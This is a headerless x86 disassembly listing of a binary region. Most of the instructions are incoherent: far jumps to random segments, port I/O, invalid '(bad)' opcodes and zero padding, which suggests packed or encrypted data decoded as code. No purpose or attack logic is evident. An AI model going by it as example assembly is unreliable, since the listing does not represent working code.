  41dc1b:	and    esi,DWORD PTR [ecx+eiz*2+0x7d]
  41dc1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc20:	test   al,0x67
  41dc22:	imul   esi,DWORD PTR [ecx-0x5f],0xe0e7abe6
  41dc29:	jmp    0x5baa:0x863a5e88
  41dc30:	ss int3 
  41dc32:	mov    cl,0xc9
  41dc34:	push   eax
  41dc35:	mov    ebp,0x7e96c10b
  41dc3a:	aas    
  41dc3b:	cmp    DWORD PTR [edi+0x23],edi
  41dc3e:	jno    0x41dbc6
  41dc40:	call   0xcd3d:0x5ad6351
  41dc47:	adc    al,0xc
  41dc49:	sti    
  41dc4a:	mov    eax,0xb8c9b69e
  41dc4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc50:	test   eax,0x9d28de46
  41dc55:	add    eax,0x28f4c0b5
  41dc5a:	xchg   WORD PTR [ebx-0x257a8b3d],bp
  41dc61:	sbb    bh,BYTE PTR [ebp+0x569179e0]
  41dc67:	xor    ah,BYTE PTR [ecx]
  41dc69:	ss sbb ah,dl
  41dc6c:	dec    edx
  41dc6d:	fbld   TBYTE PTR [ecx+0x60aa32b4]
  41dc73:	jmp    0x41dc67
  41dc75:	xchg   edx,eax
  41dc76:	arpl   WORD PTR [ecx],di
  41dc78:	mov    ds:0x4b65731d,eax
  41dc7d:	xor    BYTE PTR [eax],al
  41dc7f:	mov    BYTE PTR ds:0x6c64617c,dl
  41dc85:	sub    al,BYTE PTR [edi+0x6e3f939e]
  41dc8b:	lea    ebp,fs:[esi+0x32d34e87]
  41dc92:	add    esi,DWORD PTR [esi+ebx*4-0xf]
  41dc96:	outs   dx,DWORD PTR ds:[esi]
  41dc97:	add    DWORD PTR [ebp-0x7989dee1],esp
  41dc9d:	hlt    
  41dc9e:	cld    
  41dc9f:	or     bl,cl
  41dca1:	cmp    DWORD PTR [edx+0x19],0x44f2a5de
  41dca8:	or     DWORD PTR [ecx+0x38],edi
  41dcab:	cs inc edi
  41dcad:	pop    esp
  41dcae:	cmp    DWORD PTR [esi+0x46],0xfffffff6
  41dcb2:	xor    eax,0x984fcb82
  41dcb7:	call   0x4d2b:0xa12dcd6a
  41dcbe:	jmp    0x0:0x0
  41dcc5:	add    BYTE PTR [eax],al
  41dcc7:	add    BYTE PTR [eax],al
  41dcc9:	add    BYTE PTR [eax],al
  41dccb:	push   edx
  41dccc:	add    al,0xa2
  41dcce:	xor    dh,0xa6
  41dcd1:	jb     0x41dca7
  41dcd3:	ins    DWORD PTR es:[edi],dx
  41dcd4:	xor    dh,BYTE PTR [edx]
  41dcd6:	and    eax,0xfb1d1b4f
  41dcdb:	das    
  41dcdc:	fwait
  41dcdd:	add    DWORD PTR [eax],eax
  41dcdf:	lods   al,BYTE PTR ds:[esi]
  41dce0:	add    BYTE PTR [eax],al
  41dce2:	add    al,bl
  41dce4:	push   esp
  41dce5:	(bad)  
  41dce6:	xor    BYTE PTR [eax-0x34],al
  41dce9:	xchg   BYTE PTR [edi+eiz*4-0x27],ah
  41dced:	mov    edi,edi
  41dcef:	mov    esp,ebp
  41dcf1:	mov    cl,0xe7
  41dcf3:	xor    DWORD PTR [ecx+0x91a5ef2],ebx
  41dcf9:	mov    edi,0x95372325
  41dcfe:	adc    eax,0xa1e6f1f0
  41dd03:	pop    es
  41dd04:	push   ebp
  41dd05:	clc    
  41dd06:	cs mov al,cs:0xdcc6a0a9
  41dd0d:	xchg   edi,eax
  41dd0e:	xchg   esi,eax
  41dd0f:	add    BYTE PTR [edi+0x1fc8cf0b],al
  41dd15:	ds stos DWORD PTR es:[edi],eax
  41dd17:	add    eax,0x205088d3
  41dd1c:	mov    dl,0x4a
  41dd1e:	push   ecx
  41dd1f:	cli    
  41dd20:	jne    0x41dce6
  41dd22:	fs scas eax,DWORD PTR es:[edi]
  41dd24:	scas   al,BYTE PTR es:[edi]
  41dd25:	xchg   edi,eax
  41dd26:	xchg   edi,ebp
  41dd28:	clc    
  41dd29:	inc    esi
  41dd2a:	daa    
  41dd2b:	jnp    0x41dd0e
  41dd2d:	shl    al,0xc7
  41dd30:	lods   al,BYTE PTR ds:[esi]
  41dd31:	pop    ss
  41dd32:	mov    bh,BYTE PTR [edx+0x3788c6c]
  41dd38:	cs pop edx
  41dd3a:	es mov dh,0xed
  41dd3d:	or     eax,0x1bc1c89b
  41dd42:	mov    cl,0xc8
  41dd44:	mov    cl,0xff
  41dd46:	jae    0x41ddbe
  41dd48:	imul   esp,DWORD PTR [ebp-0x31],0x46
  41dd4c:	cmp    BYTE PTR [ebp-0x52],cl
  41dd4f:	lock dec esp
  41dd51:	iret   
  41dd52:	inc    esp
  41dd53:	loope  0x41dcef
  41dd55:	imul   ebx,edx,0x107c665d
  41dd5b:	and    DWORD PTR [edx-0x36b3a163],ebx
  41dd61:	in     eax,dx
  41dd62:	addr16 inc ebx
  41dd64:	lea    eax,[esi+0x4a6ba05c]
  41dd6a:	xchg   DWORD PTR [esi+0x4a],edi
  41dd6d:	fisubr DWORD PTR ds:0x21bb9eab
  41dd73:	dec    esi
  41dd74:	jg     0x41dd1f
  41dd76:	outs   dx,DWORD PTR ds:[esi]
  41dd77:	fdiv   QWORD PTR [ecx]
  41dd79:	sub    ch,BYTE PTR [ebx+0x23]
  41dd7c:	jg     0x41dd37
  41dd7e:	(bad)  
  41dd7f:	add    eax,0x41f41fae
  41dd84:	(bad)  
  41dd85:	mov    ds:0x665df97a,eax
  41dd8a:	xchg   edi,eax
  41dd8b:	rcl    DWORD PTR [ecx-0x73],cl
  41dd8e:	pop    ds
	...
  41dd9b:	cmp    BYTE PTR [edx-0x6a],ch
  41dd9e:	add    edx,esi
  41dda0:	(bad)  
  41dda1:	mov    ebp,0xdb4ef67b
  41dda6:	out    0xb4,eax
  41dda8:	xor    eax,0x9bdb877b
  41ddad:	add    DWORD PTR [eax],eax
  41ddaf:	lods   al,BYTE PTR ds:[esi]
  41ddb0:	add    BYTE PTR [eax],al
  41ddb2:	add    BYTE PTR [ebx-0x7343ac62],al
  41ddb8:	xchg   ebp,eax
  41ddb9:	mov    al,ds:0x8c08844e
  41ddbe:	xchg   edx,eax
  41ddbf:	outs   dx,BYTE PTR ds:[esi]
  41ddc0:	das    
  41ddc1:	mov    BYTE PTR [edi],bl
  41ddc3:	sbb    ebx,edx
  41ddc5:	push   ebx
  41ddc6:	sar    DWORD PTR [edi+eiz*2-0x708d704],cl
  41ddcd:	pusha  
  41ddce:	div    DWORD PTR [ebx+eax*8]
  41ddd1:	sbb    eax,0xe216c0e0
  41ddd6:	bound  edx,QWORD PTR [ebp+0x7d]
  41ddd9:	jnp    0x41dd78
  41dddb:	cdq    
  41dddc:	outs   dx,BYTE PTR ds:[esi]
  41dddd:	cli    
  41ddde:	mov    al,0x28
  41dde0:	ja     0x41ddc9
  41dde2:	in     al,dx
  41dde3:	dec    edi
  41dde4:	mov    ebx,0x874a4cfc
  41dde9:	imul   edx,esp,0xffffffbe
  41ddec:	outs   dx,BYTE PTR ds:[esi]
  41dded:	imul   ebp,DWORD PTR [ebp+0x36561401],0xdd6fc7cc
  41ddf7:	mov    ch,0xba
  41ddf9:	sub    BYTE PTR [esi-0x6d],bh
  41ddfc:	lea    esp,[edx+0x87c16de]
  41de02:	sub    al,0xc4
  41de04:	lods   eax,DWORD PTR ds:[esi]
  41de05:	lods   eax,DWORD PTR ds:[esi]
  41de06:	mov    ds:0x39477e3c,al
  41de0b:	pop    edx
  41de0c:	lods   al,BYTE PTR ds:[esi]
  41de0d:	cmp    ecx,DWORD PTR [esi+0x1d]
  41de10:	lahf   
  41de11:	fild   DWORD PTR [edx+0x69a4f5d6]
  41de17:	clc    
  41de18:	nop
  41de19:	das    
  41de1a:	call   0xe721d258
  41de1f:	mov    BYTE PTR [esi+0x4b06ddb1],al
  41de25:	aaa    
  41de26:	mov    dh,0x6d
  41de28:	je     0x41dded
  41de2a:	dec    esi
  41de2b:	inc    ebp
  41de2c:	(bad)  
  41de2d:	push   ecx
  41de2e:	arpl   WORD PTR [eax+0x492b3956],ax
  41de34:	call   FWORD PTR [ebp-0x2303e4d9]
  41de3a:	mov    esp,0x98c2b87b
  41de3f:	mov    al,0xf6
  41de41:	jg     0x41de1e
  41de43:	mov    dh,0x32
  41de45:	jmp    0x223692ad
  41de4a:	imul   bh
  41de4c:	loop   0x41de63
  41de4e:	or     BYTE PTR [edx-0x13],dl
  41de51:	(bad)  [eax]
  41de53:	pop    ds
  41de54:	int3   
  41de55:	outs   dx,DWORD PTR ds:[esi]
  41de56:	inc    edi
  41de57:	inc    ebp
  41de58:	loop   0x41de7a
  41de5a:	adc    al,0x79
  41de5c:	jp     0x41de02
  41de5e:	js     0x41de60
	...
  41de68:	add    BYTE PTR [eax],al
  41de6a:	add    cl,ch
  41de6c:	mov    ecx,0xf37a307a
  41de71:	jmp    0x41de6c
  41de73:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41de77:	(bad)  
  41de78:	ds mov esi,0x19c870b
  41de7e:	add    BYTE PTR [eax+eax*1-0x24a0000],ch
  41de85:	sub    ah,BYTE PTR [ecx-0x7a6a9c5d]
  41de8b:	popf   
  41de8c:	xchg   edx,eax
  41de8d:	pushf  
  41de8e:	xor    ch,BYTE PTR [eax-0x2a]
  41de91:	inc    eax
  41de92:	cmp    BYTE PTR [edx],bl
  41de94:	test   eax,0xb8922d0a
  41de99:	and    esi,ebp
  41de9b:	call   0xc2b97c4e
  41dea0:	int    0x7a
  41dea2:	push   edi
  41dea3:	add    esp,ecx
  41dea5:	jmp    0x370c:0xe11c152c
  41deac:	sar    edi,1
  41deae:	aas    
  41deaf:	ret    0xf8da
  41deb2:	pop    ecx
  41deb3:	(bad)  
  41deb4:	mov    WORD PTR [ebp+0x2b],ss
  41deb7:	pop    esi
  41deb8:	out    dx,eax
  41deb9:	clc    
  41deba:	pushf  
  41debb:	jbe    0x41df0b
  41debd:	gs stos DWORD PTR es:[edi],eax
  41debf:	aad    0x65
  41dec1:	xchg   esi,eax
  41dec2:	add    bh,BYTE PTR [edx]
  41dec4:	and    al,BYTE PTR ds:0x94c913a7
  41deca:	aad    0x1
  41decc:	mov    edi,0x40ae5c21
  41ded1:	xchg   edi,eax
  41ded2:	add    dl,BYTE PTR [eax-0x3d8d3778]
  41ded8:	cmc    
  41ded9:	xor    BYTE PTR [edi],ah
  41dedb:	adc    edi,0xff9c22ed
  41dee1:	test   DWORD PTR [edx+0x3c],ecx
  41dee4:	aam    0xaa
  41dee6:	pop    esp
  41dee7:	icebp  
  41dee8:	loopne 0x41deda
  41deea:	test   DWORD PTR [edi-0x3e],esp
  41deed:	cmp    ebp,DWORD PTR [edx+0x3cdd8794]
  41def3:	xchg   ecx,eax
  41def4:	repz push eax
  41def6:	shr    DWORD PTR [ebx+0x61ae7d25],cl
  41defc:	bswap  ebx
  41defe:	inc    ebx
  41deff:	ret    
  41df00:	mov    ah,0x26
  41df02:	mov    al,0x62
  41df04:	or     DWORD PTR [edx+0x29],esp
  41df07:	inc    edx
  41df08:	push   es
  41df09:	stc    
  41df0a:	stos   BYTE PTR es:[edi],al
  41df0b:	jae    0x41df4d
  41df0d:	inc    ecx
  41df0f:	add    edi,DWORD PTR [ebp+0x9]
  41df12:	test   dl,al
  41df14:	jne    0x41def0
  41df16:	sbb    ebp,DWORD PTR [edi+0x50d9f2ea]
  41df1c:	sub    al,0x7e
  41df1e:	mov    esi,0x47604e3a
  41df23:	mov    al,0xda
  41df25:	scas   al,BYTE PTR es:[edi]
  41df26:	xchg   esp,eax
  41df27:	sbb    al,BYTE PTR [eax+0x35]
  41df2a:	inc    ebp
  41df2b:	in     eax,0x7e
  41df2d:	lds    eax,FWORD PTR [eax+0x0]
	...
  41df38:	add    BYTE PTR [eax],al
  41df3a:	add    BYTE PTR [ebx+0x41],bl
  41df3d:	pop    ebx
  41df3e:	iret   
  41df3f:	pop    ebx
  41df40:	(bad)  
  41df42:	aad    0xf
  41df44:	ss dec esp
  41df46:	dec    esi
  41df47:	jmp    0x3348f7d4
  41df4c:	popf   
  41df4d:	add    DWORD PTR [eax],eax
  41df4f:	lods   al,BYTE PTR ds:[esi]
  41df50:	add    BYTE PTR [eax],al
  41df52:	add    BYTE PTR [ebx+0x9],dh
  41df55:	jl     0x41dee9
  41df57:	jp     0x41df42
  41df59:	push   cs
  41df5a:	and    ch,BYTE PTR [eax+eax*1-0x52658c5a]
  41df61:	paddb  mm4,QWORD PTR [ebx-0x50]
  41df65:	push   0x73
  41df67:	ds mov eax,0xd65ae88a
  41df6d:	xor    eax,0x560c28dc
  41df72:	push   esi
  41df73:	mov    dh,0x7e
  41df75:	or     bh,BYTE PTR [esi-0x1cfb66d0]
  41df7b:	cmc    
  41df7c:	pop    ebx
  41df7d:	call   0xab0:0x978907c1
  41df84:	test   eax,0xd3ebaf35
  41df89:	add    edi,esp
  41df8b:	sub    al,0xf4
  41df8d:	enter  0x4020,0x4a
  41df91:	sbb    al,0xde
  41df93:	add    eax,DWORD PTR [esi+0x2d]
  41df96:	adc    al,0xbf
  41df98:	test   eax,0x65794b50
  41df9d:	cwde   
  41df9e:	dec    ebx
  41df9f:	jbe    0x41dfd3
  41dfa1:	std    
  41dfa2:	cmp    eax,0xe4660d41
  41dfa7:	daa    
  41dfa8:	call   0x2b72:0xfb3dcd9b
  41dfaf:	adc    eax,0x130778b4
  41dfb4:	sbb    dh,BYTE PTR [ecx-0x50697b6f]
  41dfba:	mov    bh,0xc7
  41dfbc:	inc    ebp
  41dfbd:	inc    esp
  41dfbe:	test   DWORD PTR [ebx],0x4e2db43f
  41dfc4:	dec    ebx
  41dfc5:	xchg   esi,eax
  41dfc6:	and    ah,bl
  41dfc8:	out    0x19,eax
  41dfca:	cmp    BYTE PTR [ecx-0x12],ch
  41dfcd:	add    DWORD PTR [edi+esi*2+0x1a],esp
  41dfd1:	pop    ecx
  41dfd2:	or     dl,BYTE PTR [esi+0x42]
  41dfd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfd6:	sub    DWORD PTR [ebp-0x39c0f435],ebp
  41dfdc:	ja     0x41dfa2
  41dfde:	jnp    0x41df74
  41dfe0:	and    eax,0xf2e389b2
  41dfe5:	push   edi
  41dfe6:	rcl    BYTE PTR ds:0xb4d0c603,1
  41dfec:	sbb    edx,DWORD PTR [eax+0x7a]
  41dfef:	pushw  0x4b86
  41dff3:	mov    ah,BYTE PTR [ebx]
  41dff5:	jns    0x41e022
  41dff7:	and    esp,eax
  41dff9:	cdq    
  41dffa:	mov    ah,0x8
  41dffc:	lahf   
  41dffd:	rol    BYTE PTR es:[eax],cl
	...
  41e008:	add    BYTE PTR [eax],al
  41e00a:	add    BYTE PTR [ebx+0x7f3c6585],bl
  41e010:	cld    
  41e011:	(bad)  [edi-0x65be08a1]
  41e017:	adc    eax,0xdf312dfb
  41e01c:	popf   
  41e01d:	add    DWORD PTR [eax],eax
  41e01f:	lods   al,BYTE PTR ds:[esi]
  41e020:	add    BYTE PTR [eax],al
  41e022:	add    BYTE PTR [edi+esi*4-0x9],dl
  41e026:	lods   ax,WORD PTR ds:[esi]
  41e028:	imul   esi,DWORD PTR [esi],0x44f15052
  41e02e:	jbe    0x41e0a9
  41e030:	jl     0x41e04d
  41e032:	ds nop
  41e034:	sbb    BYTE PTR [ecx+0x19],ah
  41e037:	sar    DWORD PTR ds:0xfe58b7ad,0x3e
  41e03e:	cs aas 
  41e040:	mov    esp,DWORD PTR [ecx]
  41e042:	popa   
  41e043:	pusha  
  41e044:	inc    ebx
  41e045:	xor    ecx,DWORD PTR [eax+0x2037a2]
  41e04b:	push   cs
  41e04c:	jns    0x41e098
  41e04e:	and    eax,0x5b28bf03
  41e053:	in     al,dx
  41e054:	not    DWORD PTR [ebx+0x54]
  41e057:	pushf  
  41e058:	int3   
  41e059:	xchg   ecx,eax
  41e05a:	pop    esi
  41e05b:	jne    0x41e052
  41e05d:	or     cl,0xef
  41e060:	and    bh,bh
  41e062:	cwde   
  41e063:	pop    ds
  41e064:	rcl    BYTE PTR [edi-0x6],1
  41e067:	inc    esp
  41e068:	ins    DWORD PTR es:[edi],dx
  41e069:	das    
  41e06a:	out    0xec,eax
  41e06c:	sbb    DWORD PTR [edx],ecx
  41e06e:	adc    eax,0x6f9582dd
  41e073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e074:	mov    ecx,0x45d67dca
  41e079:	and    esp,DWORD PTR [esi-0xd6eef8e]
  41e07f:	sub    DWORD PTR [ecx+ebx*4-0x12],ebp
  41e083:	fwait
  41e084:	xchg   ecx,eax
  41e085:	xor    DWORD PTR [esp+ebx*8+0x56],edi
  41e089:	out    0x74,eax
  41e08b:	or     ecx,DWORD PTR [edi]
  41e08d:	lea    esi,[eax+0x70]
  41e090:	inc    ecx
  41e091:	jns    0x41e051
  41e093:	xlat   BYTE PTR ds:[ebx]
  41e094:	loopne 0x41e0c1
  41e096:	mov    BYTE PTR [ebx-0x67],cl
  41e099:	(bad)  
  41e09a:	lahf   
  41e09b:	pop    edi
  41e09c:	or     al,BYTE PTR [eax+ecx*1-0x14]
  41e0a0:	dec    ebp
  41e0a1:	pusha  
  41e0a2:	popa   
  41e0a3:	int    0xe8
  41e0a5:	or     DWORD PTR ds:0xeb92122e,ecx
  41e0ab:	push   edi
  41e0ac:	add    eax,0x24ff7824
  41e0b1:	dec    edi
  41e0b2:	push   ecx
  41e0b3:	push   cs
  41e0b4:	int    0xf8
  41e0b6:	(bad)  
  41e0b7:	stc    
  41e0b8:	jno    0x41e0ae
  41e0ba:	and    BYTE PTR [eax+0x5d971e28],dh
  41e0c0:	fstp   TBYTE PTR [ecx-0x39]
  41e0c3:	js     0x41e080
  41e0c5:	adc    al,0x10
  41e0c7:	and    bh,ch
  41e0c9:	adc    eax,0xadd654f8
  41e0ce:	push   esi
	...
  41e0db:	outs   dx,BYTE PTR ds:[esi]
  41e0dc:	jae    0x41e0ce
  41e0de:	retf   0xcbfd
  41e0e1:	jle    0x41e0da
  41e0e3:	repz xor eax,0x669e8ce9
  41e0e9:	ins    DWORD PTR es:[edi],dx
  41e0ea:	or     DWORD PTR [ebx-0x53fffe62],0x0
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	cmp    DWORD PTR [eax-0x6f],ecx
  41e0f6:	mov    edx,0x7ec1b980
  41e0fb:	inc    edi
  41e0fc:	(bad)  
  41e0fd:	jmp    0x4519:0xcd12301a
  41e104:	mov    ebp,cs
  41e106:	sbb    DWORD PTR [ebx],eax
  41e108:	(bad)  
  41e109:	(bad)  [edx-0xff9634d]
  41e10f:	sub    ebx,DWORD PTR [esi+0x68]
  41e112:	inc    esp
  41e113:	cmc    
  41e114:	and    ebx,DWORD PTR [esp+edx*8-0x2a]
  41e118:	outs   dx,BYTE PTR ds:[esi]
  41e119:	adc    al,0xcc
  41e11b:	(bad)  
  41e11c:	pop    esp
  41e11d:	mov    esi,0x175c4e
  41e122:	add    BYTE PTR [ebp-0x5f],dh
  41e125:	outs   dx,DWORD PTR ds:[esi]
  41e126:	add    cl,BYTE PTR [edi-0x22]
  41e129:	mov    ch,0x73
  41e12b:	xor    bh,BYTE PTR [eax+0xe]
  41e12e:	pop    edx
  41e12f:	aas    
  41e130:	cmp    ecx,ebx
  41e132:	push   edx
  41e133:	ficom  DWORD PTR [eax+ebp*2+0x5c]
  41e137:	cmp    DWORD PTR [esi],ebp
  41e139:	les    edx,FWORD PTR [edi+0x1e80f4e]
  41e13f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e140:	popa   
  41e141:	mov    dl,0x47
  41e143:	mov    dl,0x85
  41e145:	out    dx,al
  41e146:	aad    0xf1
  41e148:	inc    esp
  41e149:	loopne 0x41e175
  41e14b:	or     dh,al
  41e14d:	mov    ?,WORD PTR [edx+0x4dd56240]
  41e153:	or     BYTE PTR [eax-0x6044fd14],dl
  41e159:	loope  0x41e11b
  41e15b:	cmp    BYTE PTR [esi-0x2cb43878],cl
  41e161:	sub    al,0xd
  41e163:	pop    edi
  41e164:	retf   
  41e165:	(bad)
  41e169:	mov    esi,0x10e0f91c
  41e16e:	mov    ch,0x14
  41e170:	imul   BYTE PTR [ebx+edi*4+0x77878378]
  41e177:	and    eax,0xda544850
  41e17c:	sbb    BYTE PTR [esi+0x76],bh
  41e17f:	push   ebp
  41e180:	leave  
  41e181:	jo     0x41e178
  41e183:	in     eax,dx
  41e184:	call   0xc0d42899
  41e189:	outs   dx,BYTE PTR ds:[esi]
  41e18a:	adc    eax,0x5a3295c
  41e18f:	call   0xfa02:0xc79f3b38
  41e196:	fisttp WORD PTR [eax+0x4d]
  41e199:	mov    ds:0x45046310,al
  41e19e:	das    
	...
  41e1ab:	cmc    
  41e1ac:	adc    al,0xae
  41e1ae:	adc    ebp,edi
  41e1b0:	mov    ebx,0x84e6f6fd
  41e1b5:	lds    ebp,FWORD PTR [edx+0x31c78c85]
  41e1bb:	aaa    
  41e1bc:	lahf   
  41e1bd:	add    DWORD PTR [eax],eax
  41e1bf:	lods   al,BYTE PTR ds:[esi]
  41e1c0:	add    BYTE PTR [eax],al
  41e1c2:	add    dl,al
  41e1c4:	imul   ebx,DWORD PTR [esi-0x3],0x0
  41e1c8:	sub    eax,0xf7c33bbe
  41e1cd:	or     ecx,DWORD PTR [ebx]
  41e1cf:	cmp    eax,0x88f8e632
  41e1d4:	xor    esi,DWORD PTR [esi+0x34]
  41e1d7:	mov    ebp,DWORD PTR [edi+0x53f831c5]
  41e1dd:	out    0x55,eax
  41e1df:	js     0x41e1b8
  41e1e1:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1e3:	xchg   esi,eax
  41e1e4:	daa    
  41e1e5:	pop    ebx
  41e1e6:	adc    BYTE PTR [ebx+0x3bc6861d],dl
  41e1ec:	cmp    bl,ch
  41e1ee:	test   al,0xeb
  41e1f0:	mov    ebp,0xe73c067d
  41e1f5:	jg     0x41e1ef
  41e1f7:	xlat   BYTE PTR ds:[ebx]
  41e1f8:	fisttp WORD PTR [ebp+0x14]
  41e1fb:	xchg   DWORD PTR [ebx+0x12],ecx
  41e1fe:	inc    ecx
  41e1ff:	inc    ecx
  41e200:	pop    ebp
  41e201:	nop
  41e202:	push   es
  41e203:	loopne 0x41e255
  41e205:	push   ss
  41e206:	sbb    bl,dh
  41e208:	jg     0x41e211
  41e20a:	push   ss
  41e20b:	mov    dl,cl
  41e20d:	clc    
  41e20e:	and    ah,ah
  41e210:	dec    ecx
  41e211:	xor    DWORD PTR [eax+0x2d2ca54],ecx
  41e217:	enter  0xef46,0x49
  41e21b:	xor    eax,DWORD PTR [esi]
  41e21d:	ss (bad) 
  41e21f:	sbb    eax,0x1a20fd8
  41e224:	jbe    0x41e25a
  41e226:	cwde   
  41e227:	mov    DWORD PTR [ebx+edx*4+0x6c],0x9ee8a66f
  41e22f:	lods   eax,DWORD PTR ds:[esi]
  41e230:	push   ebx
  41e231:	mov    eax,0x16357607
  41e236:	and    BYTE PTR [edx+0x753a4d3a],0xc8
  41e23d:	mov    dl,0xc7
  41e23f:	push   ecx
  41e240:	inc    ebp
  41e241:	push   esi
  41e242:	es leave 
  41e244:	les    edi,FWORD PTR [ebx]
  41e246:	icebp  
  41e247:	ins    BYTE PTR es:[edi],dx
  41e248:	stc    
  41e249:	jne    0x41e24a
  41e24b:	hlt    
  41e24c:	dec    edx
  41e24d:	jmp    0x41e252
  41e24f:	or     edi,DWORD PTR [edi+0x6de902bb]
  41e255:	xor    BYTE PTR [ecx+0x579b1bfe],ah
  41e25b:	fs or  edx,eax
  41e25e:	aad    0xc1
  41e260:	inc    ebp
  41e261:	dec    ebx
  41e262:	lahf   
  41e263:	in     al,dx
  41e264:	(bad)  
  41e265:	cld    
  41e266:	dec    ebp
  41e267:	inc    ecx
  41e268:	mov    BYTE PTR [ebp+0x38],bh
  41e26b:	mov    ebx,ebp
  41e26d:	push   ebx
  41e26e:	add    DWORD PTR [eax],eax
	...
  41e278:	add    BYTE PTR [eax],al
  41e27a:	add    BYTE PTR [ebx],bh
  41e27c:	mov    cl,0x57
  41e27e:	lock fcomip st,st(6)
  41e281:	mov    edi,0xbb1c16fb
  41e286:	rcr    BYTE PTR [esi+0x1e],0xd6
  41e28a:	sahf   
  41e28b:	jecxz  0x41e22c
  41e28d:	add    DWORD PTR [eax],eax
  41e28f:	lods   al,BYTE PTR ds:[esi]
  41e290:	add    BYTE PTR [eax],al
  41e292:	add    BYTE PTR [eax],bh
  41e294:	pop    esp
  41e295:	ret    
  41e296:	cmp    DWORD PTR [ecx-0x50da4e80],edx
  41e29c:	clc    
  41e29d:	mov    esi,0xaea8bb65
  41e2a2:	and    ch,cl
  41e2a4:	stos   DWORD PTR es:[edi],eax
  41e2a5:	fimul  WORD PTR [ecx-0x76dfc18b]
  41e2ab:	push   cs
  41e2ac:	mov    ecx,0xe865e7da
  41e2b1:	rcl    DWORD PTR [esi+0x55c676c8],1
  41e2b7:	xchg   ebp,eax
  41e2b8:	sub    esi,esi
  41e2ba:	ror    DWORD PTR [ebx+edi*8+0x45],0x9a
  41e2bf:	es (bad) 
  41e2c1:	retf   0x9832
  41e2c4:	or     BYTE PTR [ebx+0x1c7addfa],0xd9
  41e2cb:	neg    eax
  41e2cd:	lds    eax,FWORD PTR ds:0x53d11d8a
  41e2d3:	(bad)  
  41e2d4:	cmc    
  41e2d5:	in     al,0x8c
  41e2d7:	xchg   esi,eax
  41e2d8:	mov    bl,0x1b
  41e2da:	push   ebp
  41e2db:	inc    esi
  41e2dc:	je     0x41e25e
  41e2de:	pop    edx
  41e2df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2e0:	test   DWORD PTR [edi-0x3c],esi
  41e2e3:	jnp    0x41e30d
  41e2e5:	xchg   edx,eax
  41e2e6:	cmp    bh,dh
  41e2e8:	jo     0x41e352
  41e2ea:	adc    BYTE PTR [esi],bh
  41e2ec:	sbb    BYTE PTR [ebx+0x55],ch
  41e2ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2f0:	repnz and edx,DWORD PTR [ecx-0x10a06281]
  41e2f7:	jmp    0x8ff0:0x4c1cbbd0
  41e2fe:	fcmovnb st,st(2)
  41e300:	or     esi,ecx
  41e302:	xor    eax,ebp
  41e304:	inc    esp
  41e305:	push   edi
  41e306:	call   0xd8a:0x6b39006
  41e30d:	mov    ebp,0xfcae9b78
  41e312:	jle    0x41e2ec
  41e314:	sbb    ebx,0x5d
  41e317:	push   esp
  41e318:	in     eax,dx
  41e319:	mov    al,ds:0x3ef9bffe
  41e31e:	nop
  41e31f:	lods   al,BYTE PTR ds:[esi]
  41e320:	or     DWORD PTR [ebp+esi*8-0x2f],ebx
  41e324:	outs   dx,DWORD PTR ds:[esi]
  41e325:	mov    bh,0xa3
  41e327:	and    BYTE PTR [edi+0x2a],ah
  41e32a:	adc    al,0xce
  41e32c:	mov    cl,0x62
  41e32e:	das    
  41e32f:	mov    al,0x8f
  41e331:	cmp    al,0x19
  41e333:	popf   
  41e334:	int3   
  41e335:	add    al,0xe1
  41e337:	pop    edi
  41e338:	lahf   
  41e339:	rcr    cl,cl
  41e33b:	loopne 0x41e34f
  41e33d:	ds leave 
	...
  41e34b:	aam    0xf
  41e34d:	push   ecx
  41e34e:	lock (bad) 
  41e351:	cmc    
  41e352:	das    
  41e353:	sbb    BYTE PTR [eax],cl
  41e355:	xchg   ebx,eax
  41e356:	iret   
  41e357:	imul   esp,DWORD PTR [ebx+0x7d],0x1a08f48
  41e35e:	add    BYTE PTR [eax+eax*1+0xf490000],ch
  41e365:	dec    ebx
  41e366:	nop
  41e367:	mov    al,0xd1
  41e369:	xchg   edi,eax
  41e36a:	add    al,0xa9
  41e36c:	cmp    DWORD PTR [ebx-0x2],0x18fa09d8
  41e373:	pop    edx
  41e374:	je     0x41e3bd
  41e376:	lea    edx,[ecx+0x714399da]
  41e37c:	push   esi
  41e37d:	jmp    0xdf648dcc
  41e382:	test   eax,0x8c24ae3
  41e387:	push   eax
  41e388:	ja     0x41e359
  41e38a:	into   
  41e38b:	xor    eax,0x12b12f18
  41e390:	cmp    esi,DWORD PTR [edi]
  41e392:	xchg   BYTE PTR [eax],bl
  41e394:	jmp    0x5dd0661d
  41e399:	sub    ebx,DWORD PTR [ecx]
  41e39b:	mov    ds:0xe65883c0,al
  41e3a0:	(bad)  
  41e3a1:	fucomp st(1)
  41e3a3:	mov    eax,DWORD PTR [edi]
  41e3a5:	xchg   ch,bh
  41e3a7:	stos   DWORD PTR es:[edi],eax
  41e3a8:	pop    eax
  41e3a9:	test   DWORD PTR [ebp-0x53],edx
  41e3ac:	xchg   ebx,eax
  41e3ad:	scas   eax,DWORD PTR es:[edi]
  41e3ae:	in     eax,0xac
  41e3b0:	pop    es
  41e3b1:	pop    eax
  41e3b2:	js     0x41e3b8
  41e3b4:	lock mov BYTE PTR [ebx+0x19],ah
  41e3b8:	or     al,al
  41e3ba:	ret    
  41e3bb:	das    
  41e3bc:	jbe    0x41e419
  41e3be:	inc    edi
  41e3bf:	xor    al,0x2f
  41e3c1:	jne    0x41e406
  41e3c3:	int3   
  41e3c4:	adc    eax,0x5e338472
  41e3c9:	test   eax,0xe6bcfcb4
  41e3ce:	push   es
  41e3cf:	or     eax,0xe04c9ec3
  41e3d4:	xor    al,0xa8
  41e3d6:	in     eax,dx
  41e3d7:	dec    edx
  41e3d8:	arpl   bx,bx
  41e3da:	out    dx,eax
  41e3db:	aam    0x5c
  41e3dd:	sahf   
  41e3de:	fwait
  41e3df:	inc    esi
  41e3e0:	and    edx,DWORD PTR [edi]
  41e3e2:	std    
  41e3e3:	push   esi
